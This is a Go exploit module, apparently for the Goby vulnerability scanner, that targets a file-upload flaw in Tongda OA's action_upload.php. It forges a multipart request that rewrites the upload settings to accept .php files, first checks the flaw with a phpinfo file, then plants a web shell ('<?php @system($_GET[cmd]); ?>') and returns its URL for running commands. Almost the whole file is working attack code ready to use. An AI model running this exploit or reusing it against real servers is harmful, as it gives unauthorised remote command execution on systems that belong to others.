package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tongda OA action_upload.php file upload getshell",
    "Description": "The Tongda OA action_upload.php file has a file upload vulnerability. Attackers can use this vulnerability to gain server permissions.",
    "Product": "TongDa-OA",
    "Homepage": "http://www.tongda2000.com/",
    "DisclosureDate": "2021-03-17",
    "Author": "go0p",
    "FofaQuery": "app=\"TongDa-OA\" || app=\"TDXK-Tongda OA\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": [
        "http://fofa.so"
    ],
    "HasExp": false,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": true,
                "method": "GET",
                "uri": "/"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "getshell"
    ],
    "CVEIDs": null,
    "CVSSScore": null,
    "AttackSurfaces": {
        "Application": [
            "TongDa-OA"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10174"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomFilename := goutils.RandomHexString(4)
			cfg := httpclient.NewPostRequestConfig("/module/ueditor/php/action_upload.php?action=uploadfile")
			cfg.VerifyTls = false
			cfg.Header.Store("X_Requested_With", "XMLHttpRequest")
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------55719851240137822763221368724")
			cfg.Data = "-----------------------------55719851240137822763221368724\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"CONFIG[fileFieldName]\"\r\n\r\n"
			cfg.Data += "ff\r\n"
			cfg.Data += "-----------------------------55719851240137822763221368724\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"CONFIG[fileMaxSize]\"\r\n\r\n"
			cfg.Data += "1000000000\r\n"
			cfg.Data += "-----------------------------55719851240137822763221368724\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"CONFIG[filePathFormat]\"\r\n\r\n"
			cfg.Data += randomFilename + "\r\n"
			cfg.Data += "-----------------------------55719851240137822763221368724\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"CONFIG[fileAllowFiles][]\"\r\n\r\n"
			cfg.Data += ".php\r\n"
			cfg.Data += "-----------------------------55719851240137822763221368724\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"ff\"; filename=\"test.php\"\r\n"
			cfg.Data += "Content-Type: application/octet-stream\r\n\r\n"
			cfg.Data += "<?php phpinfo();?>\r\n"
			cfg.Data += "-----------------------------55719851240137822763221368724\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"mufile\"\r\n\r\n"
			cfg.Data += "submit\r\n"
			cfg.Data += "-----------------------------55719851240137822763221368724--\r\n"

			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 {
				if resp, err := httpclient.SimpleGet(u.FixedHostInfo + "/" + randomFilename + ".php"); err == nil && resp.StatusCode == 200 &&
					strings.Contains(resp.Utf8Html, "phpinfo") {
					return true
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			randomFilename := goutils.RandomHexString(4)
			cfg := httpclient.NewPostRequestConfig("/module/ueditor/php/action_upload.php?action=uploadfile")
			cfg.VerifyTls = false
			cfg.Header.Store("X_Requested_With", "XMLHttpRequest")
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------55719851240137822763221368724")
			cfg.Data = "-----------------------------55719851240137822763221368724\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"CONFIG[fileFieldName]\"\r\n\r\n"
			cfg.Data += "ff\r\n"
			cfg.Data += "-----------------------------55719851240137822763221368724\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"CONFIG[fileMaxSize]\"\r\n\r\n"
			cfg.Data += "1000000000\r\n"
			cfg.Data += "-----------------------------55719851240137822763221368724\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"CONFIG[filePathFormat]\"\r\n\r\n"
			cfg.Data += randomFilename + "\r\n"
			cfg.Data += "-----------------------------55719851240137822763221368724\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"CONFIG[fileAllowFiles][]\"\r\n\r\n"
			cfg.Data += ".php\r\n"
			cfg.Data += "-----------------------------55719851240137822763221368724\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"ff\"; filename=\"test.php\"\r\n"
			cfg.Data += "Content-Type: application/octet-stream\r\n\r\n"
			cfg.Data += "<?php @system($_GET[cmd]); ?>\r\n"
			cfg.Data += "-----------------------------55719851240137822763221368724\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"mufile\"\r\n\r\n"
			cfg.Data += "submit\r\n"
			cfg.Data += "-----------------------------55719851240137822763221368724--\r\n"

			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 {
				if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/" + randomFilename + ".php"); err == nil && resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = "Webshell: " + expResult.HostInfo.FixedHostInfo + "/" + randomFilename + ".php?cmd=whoami"
				}
			}
			return expResult
		},
	))
}
